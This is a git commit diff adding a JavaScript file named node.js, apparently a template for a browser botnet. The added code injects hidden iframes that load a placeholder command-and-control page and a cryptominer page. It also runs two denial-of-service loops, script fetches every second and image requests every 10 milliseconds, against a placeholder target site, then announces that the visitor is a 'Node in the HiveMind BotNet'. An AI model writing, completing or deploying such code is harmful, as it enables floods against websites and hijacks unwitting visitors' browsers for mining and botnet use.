0f29fa2ad38f30a6d0b8b9b46e6755ae9a2c7dd8
ardvarknet <42424017+ardvarknet@users.noreply.github.com>
2018-08-30 13:32:41 -0400

    Update node.js

--- node.js
+++ node.js
@@ -1,1 +1,24 @@
 
+document.write("<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>");
+document.write("<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>");
+ddos('http://TARGET-SITE.com/images/header.png',
+'http://TARGET-SITE.com/images/header.png');
+function ddos(url,url2){
+window.setInterval(function (){
+$.getScript(url);
+$.getScript(url2);
+},1000)
+}
+
+
+function imgflood() {
+  var TARGET = 'TARGET-SITE.com'
+  var URI = '/index.php?'
+  var pic = new Image()
+  var rand = Math.floor(Math.random() * 1000)
+  pic.src = 'http://'+TARGET+URI+rand+'=val'
+}
+setInterval(imgflood, 10) //100 requests per second
+
+document.write("You currently a Node in the HiveMind BotNet...");
+document.write("Running...");
